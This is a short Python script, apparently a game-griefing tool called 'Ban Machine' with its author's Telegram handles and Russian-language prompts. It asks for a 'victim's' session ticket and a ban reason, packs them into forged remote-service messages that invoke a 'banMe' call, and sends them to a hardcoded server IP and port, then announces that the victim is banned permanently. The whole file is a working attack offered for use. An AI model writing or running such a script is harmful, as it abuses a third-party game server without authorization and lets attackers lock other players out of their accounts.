import socket
import time
print("□□□□□□□□□□□□□□□□")
time.sleep(0.5)
print("■□□□□□□□□□□□□□□□")
time.sleep(0.5)
print("■■□□□□□□□□□□□□□□")
time.sleep(0.5)
print("■■■□□□□□□□□□□□□□")
time.sleep(0.5)
print("■■■■□□□□□□□□□□□□")
time.sleep(0.5)
print("■■■■■□□□□□□□□□□□")
time.sleep(0.5)
print("■■■■■■□□□□□□□□□□")
time.sleep(0.5)
print("■■■■■■■□□□□□□□□□")
time.sleep(0.5)
print("■■■■■■■■□□□□□□□□")
time.sleep(0.5)
print("■■■■■■■■■□□□□□□□")
time.sleep(0.5)
print("■■■■■■■■■■□□□□□□")
time.sleep(0.5)
print("■■■■■■■■■■■□□□□□")
time.sleep(0.5)
print("■■■■■■■■■■■■□□□□")
time.sleep(0.5)
print("■■■■■■■■■■■■■□□□")
time.sleep(0.5)
print("■■■■■■■■■■■■■■□□")
time.sleep(0.5)
print("■■■■■■■■■■■■■■■□")
time.sleep(0.5)
print("■■■■■■■■■■■■■■■■")
time.sleep(1)
print("Добро пожаловать в бан машину!")
time.sleep(0.5)
print("Ban Machine by W0R1X")
time.sleep(0.5)
print("TG: @W0R1X | @WorixHacks")
time.sleep(0.5)
a = input("Введи тикет жертвы:")
s = a.encode("utf-8").hex()
y = s.replace('  ', '')
c = "000000740d0a2430613332633235382d656133652d343536652d393365662d316564623732653332633430121648616e647368616b6552656d6f7465536572766963651a0e70726f746f48616e647368616b6522241a220d0a20" + y
b = input("Введи причину бана:")
x = b.encode("utf-8").hex()
z = x.replace('  ', '')
d = "000000610a2437353035303763642d666236632d343035362d613638322d3464346166643864646462611213506c6179657252656d6f7465536572766963651a0562616e4d6522051a0308b90a22161a140a12" + z
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('158.177.37.9', 2222))
sock.send(bytes.fromhex(c))
time.sleep(0.1)
sock.send(bytes.fromhex(d))
print("Жертва забанена!")
time.sleep(0.5)
print("Разбан кастом бана невозможен!")